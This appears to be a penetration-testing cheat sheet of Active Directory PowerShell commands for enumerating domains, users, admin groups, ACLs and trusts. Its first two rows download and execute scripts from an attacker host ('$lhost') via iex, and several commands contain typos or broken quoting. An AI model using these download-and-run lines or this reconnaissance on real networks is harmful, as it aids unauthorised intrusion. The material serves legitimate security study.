# ActiveDirectory PowerShell Module

<table><thead><tr><th width="338">Info</th><th width="393">Command</th></tr></thead><tbody><tr><td>Download &#x26; Import Microsoft Active Directory Module</td><td><code>iex (new-Object Net.WebClient).DownloadString('http://$lhost/windows/privesc/Import-ActiveDirectory.ps1');Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose</code></td></tr><tr><td>Download &#x26; Import Microsoft Active Directory Module</td><td><code>iex (new-Object Net.WebClient).DownloadString('http://$lhost/windows/privesc/ActiveDirectory.psd1');Import-Module .\ActiveDirectory.psd1</code></td></tr><tr><td>Get Domain (ActiveDirectory Module)</td><td><code>Get-ADDomain</code></td></tr><tr><td>Get object of another domain (ActiveDirectory Module)</td><td><code>Get-ADDomain -Identity domain.local</code></td></tr><tr><td>Get domain SID for the current domain (ActiveDirectory Module)</td><td><code>(Get-ADDomain).DomainSID</code></td></tr><tr><td>Get domain policy for the current domain (ActiveDirectory Module)</td><td>``</td></tr><tr><td>Get domain controllers for the current domain</td><td><code>Get-ADDomainController</code></td></tr><tr><td>Get domain controllers for another domain</td><td><code>Get-ADDomainController - DomainName domain.local -Discover</code></td></tr><tr><td>Get a list of users in the current domain</td><td><code>Get-ADUser -Filter * -Properties *</code></td></tr><tr><td>Get list of properties for all users in the current domain</td><td><code>Get-ADUser -Filter * - Properties *</code></td></tr><tr><td>Get User description</td><td>`Get-ADUser - Filter 'Description -like "<em>built</em>" -Properties Description</td></tr><tr><td>Get a list of computers in the current domain</td><td><code>Get-ADComputer -Filter * | Select Name</code></td></tr><tr><td>Get a list of computers in the current domain</td><td><code>Get-ADComputer 'OperatingSystem -like "*Server 2016*" -Properties OperatingSystem | Select Name,OperatingSystem</code></td></tr><tr><td>Get a list of computers in the current domain</td><td><code>Get-ADComputer -Filter * -Properties DNSHostName | % {Test-Connection -Count 1 -ComputerName $_.DNSHostName}</code></td></tr><tr><td>Get a list of computers in the current domain</td><td><code>Get-ADComputer -Filter * -Properties *</code></td></tr><tr><td>Get all groups in the current domain</td><td><code>Get-ADGroup -Filter * | Select Name</code></td></tr><tr><td>Get all groups in the current domain</td><td><code>Get-ADGroup -Filter * -Properties *</code></td></tr><tr><td>Get all groups in the current domain with admin in the name</td><td><code>Get-ADGroup -Filter 'Name -like "*admin*"' | select Name</code></td></tr><tr><td>Get all the members of the Domain Admins group</td><td><code>Get-ADGroupMember -Identity "Domain Admins" -Recursive</code></td></tr><tr><td>Get the group memberships for a user</td><td><code>Get-ADPrincipalGroupMembership -Identity user1</code></td></tr><tr><td>Get resultant set of group policies</td><td><code>GetGPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html</code></td></tr><tr><td>Get OUs in a domain</td><td><code>Get-ADOrganizationalUnit -Filter * -Properties *</code></td></tr><tr><td>Enumerate ACLs</td><td><code>(Get-Acl 'AD:\CN=Administrators,CN=Users,DC=domain,DC=local).Access</code></td></tr><tr><td>Get a list of all domain trusts for the current domain</td><td><code>Get-ADTrust</code></td></tr><tr><td>Get a list of all domain trusts for the current domain</td><td><code>Get-ADTrust -Identity domain.local</code></td></tr><tr><td>Get details about the curren forest</td><td><code>Get-ADForest</code></td></tr><tr><td>Get details about the curren forest</td><td><code>Get-ADForest -Identity domain.local</code></td></tr><tr><td>Get all domains in the current forest</td><td><code>(Get-ADForest).Domains</code></td></tr><tr><td>Get all global catalogs for the current forest</td><td><code>Get-ADForest | select -ExpandProperty GlobalCatalogs</code></td></tr><tr><td>Map trusts of a forest</td><td><code>Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"</code></td></tr></tbody></table>
